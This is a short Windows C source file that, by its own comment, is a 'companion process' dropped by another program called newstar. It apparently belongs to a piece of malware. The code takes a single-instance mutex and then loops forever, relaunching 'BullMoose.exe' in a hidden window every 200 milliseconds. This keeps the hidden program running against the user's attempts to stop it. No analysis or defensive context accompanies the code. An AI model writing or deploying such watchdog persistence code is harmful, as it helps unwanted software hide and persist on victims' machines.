// This is not part of the main program, this is the companion process that newstar drops.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
int main(void)
{
	CreateMutex(NULL,0,"Mfd43 Mx3 Bull Moose");
	if(GetLastError()==ERROR_ALREADY_EXISTS) return 1;
	while(1) {
		WinExec("BullMoose.exe",SW_HIDE);
		Sleep(200);
	}
}
